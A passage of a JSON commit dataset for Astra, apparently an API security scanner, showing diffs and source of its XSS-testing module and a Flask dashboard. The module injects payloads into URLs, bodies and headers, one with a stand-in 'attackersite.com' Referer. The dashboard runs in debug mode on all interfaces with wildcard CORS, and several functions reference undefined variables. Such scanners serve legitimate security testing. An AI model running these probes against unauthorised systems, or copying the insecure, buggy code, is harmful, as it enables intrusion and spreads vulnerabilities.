IE)\n@@ -53,11 +91,12 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         host_header = {\"Host\" : parse_domain + '/' + payload}\n         headers.update(host_header)\n         host_header_xss = req.api_request(url, \"GET\", headers)\n-        if host_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if host_header_xss.text.find(decoded_payload) != -1:\n             impact = \"Low\"\n-            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-            dbupdate.insert_record(xss_http_headers)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n             break\n \n     # Test for Referer based XSS \n@@ -66,12 +105,14 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n-        if ref_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if ref_header_xss.text.find(decoded_payload) != -1:\n+            print ref_header_xss.text\n             impact = check_xss_impact(temp_headers)\n             print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n             attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n             dbupdate.insert_record(attack_result)\n-            break\n+            return\n \n \n def xss_get_url(url,method,headers,body,scanid=None):\n@@ -90,20 +131,21 @@ def xss_get_url(url,method,headers,body,scanid=None):\n         parsed_url = url\n \n     for payload in xss_payloads:\n-            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if result is not True:\n-                if xss_request_url.text.find(payload) != -1:\n-                    impact = check_xss_impact(xss_request_url.headers)\n-                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n-                    dbupdate.insert_record(attack_result)\n-                    result = True\n-\n-            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact()\n-                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+        if result is not True:\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_request_url.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_request_url.headers)\n                 attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n+                result = True\n+\n+        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n+        if xss_request_url.text.find(decoded_payload) != -1:\n+            impact = check_xss_impact(xss_request_uri.headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+            dbupdate.insert_record(attack_result)\n                 \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n@@ -126,7 +168,10 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        if xss_request.text.find(payload) != -1:\n+                        decoded_payload = xss_payload_decode(payload)\n+                        print decoded_payload\n+                        print xss_url\n+                        if xss_request.text.find(decoded_payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n                             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n@@ -147,7 +192,8 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n \n         if vul_param:\n             # Update all vulnerable params to db.\n-            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n+            print vul_param,scanid\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -155,5 +201,8 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-    \n+\n+    if method == 'POST' or method == 'PUT':\n+        xss_post_method(url,method,headers,body,scanid)\n+\n     xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
            "message": "",
            "files": {
                "/API/api.py": {
                    "changes": [
                        {
                            "diff": "\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts",
                            "add": 1,
                            "remove": 1,
                            "filename": "/API/api.py",
                            "badparts": [
                                "from apiscan import scan_single_api"
                            ],
                            "goodparts": [
                                "from astra import scan_single_api"
                            ]
                        }
                    ],
                    "source": "\nimport ast import json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0', port=8094,debug=True) ",
                    "sourceWithComments": "import ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom apiscan import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n"
                }
            },
            "msg": "XSS module changes"
        },
        "27377aa23bcd9153453a2ee04c3dc33120c3b093": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/27377aa23bcd9153453a2ee04c3dc33120c3b093",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/27377aa23bcd9153453a2ee04c3dc33120c3b093",
            "sha": "27377aa23bcd9153453a2ee04c3dc33120c3b093",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 6b3c332..0ca843a 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -62,7 +62,7 @@ def xss_post_method(url,method,headers,body,scanid=None):\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "                impact = check_xss_impact(xss_post.body)"
                            ],
                            "goodparts": [
                                "                impact = check_xss_impact(xss_post_request.headers)"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "Minor changes in xss_post_method function"
        },
        "adf60251870f581f368cfd5a6d5e0337e9ba4c76": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/adf60251870f581f368cfd5a6d5e0337e9ba4c76",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/adf60251870f581f368cfd5a6d5e0337e9ba4c76",
            "sha": "adf60251870f581f368cfd5a6d5e0337e9ba4c76",
            "keyword": "XSS change",
